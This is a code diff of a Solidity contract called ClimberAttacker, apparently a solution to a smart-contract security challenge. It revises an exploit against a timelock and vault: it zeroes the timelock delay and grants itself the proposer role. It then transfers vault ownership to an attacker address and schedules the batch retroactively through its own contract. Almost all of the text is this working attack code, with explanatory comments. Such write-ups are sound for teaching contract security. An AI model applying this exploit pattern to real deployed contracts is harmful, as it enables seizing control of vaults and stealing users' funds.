@@ -2,9 +2,7 @@
 
 pragma solidity ^0.8.0;
 
-import "@openzeppelin/contracts/utils/Address.sol";
-import "@openzeppelin/contracts/utils/Strings.sol";
-
+import "./ClimberVault.sol";
 
 interface IClimberTimelock {
     function execute(
@@ -23,39 +21,42 @@ interface IClimberTimelock {
 }
 
 contract ClimberAttacker {
-    address[] targets;
-    uint256[] values;
-    bytes[] dataElements;
-    bytes32 salt;
-    using Strings for uint256;
+    address[] private targets;
+    uint256[] private values;
+    bytes[] private dataElements;
+    bytes32 private salt;
+    IClimberTimelock private timelock;
+    address private vault;
+    address private attacker;
 
-    IClimberTimelock timelock;
-
-    constructor (address _timelock) {
+    constructor (address _timelock, address _vault, address _attacker) {
         timelock = IClimberTimelock(_timelock);
-
+        vault = _vault;
+        attacker = _attacker;
     }
 
-    function attack() external payable {
+    function attack() external {
+        // update delay to 0 to execute tasks instantly
         targets.push(address(timelock));
+        values.push(0);
+        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));
+
+        // grant the proposer role to this contract to be able to schedule tasks
         targets.push(address(timelock));
+        values.push(0);
+        dataElements.push(abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this)));
+
+        // transfer ownership to the attacker
+        targets.push(address(vault));
+        values.push(0);
+        dataElements.push(abi.encodeWithSignature("transferOwnership(address)", attacker));
+
+        // schedule the above tasks through this contract
+        dataElements.push(abi.encodeWithSignature("schedule()"));
+        values.push(0);
         targets.push(address(this));
 
-        values.push(0);
-        values.push(0);
-        values.push(0);
-
         salt = keccak256("SALT");
-
-        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));
-        dataElements.push(abi.encodeWithSignature("grantRole(bytes32,address)",keccak256("PROPOSER_ROLE"), address(this)));
-        dataElements.push(abi.encodeWithSignature("schedule()"));
-        //timelock.schedule has to be executed through a proxy (this contract) because the dataElements hashing will never match
-        // First I tried to call the schedule function directly but the dataElements passed to schedule was not matching the
-        // one passed to execute since the one passed to schedule pointed to itself in an earlier state always :
-        //  dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", uint64(0));
-        //  dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)",keccak256("PROPOSER_ROLE"), address(this));
-        //  dataElements[2] = abi.encodeWithSignature("schedule(address[],uint256[],bytes[],bytes32)", targets, values, dataElements, salt);
 
         timelock.execute(targets, values, dataElements, salt);
     }
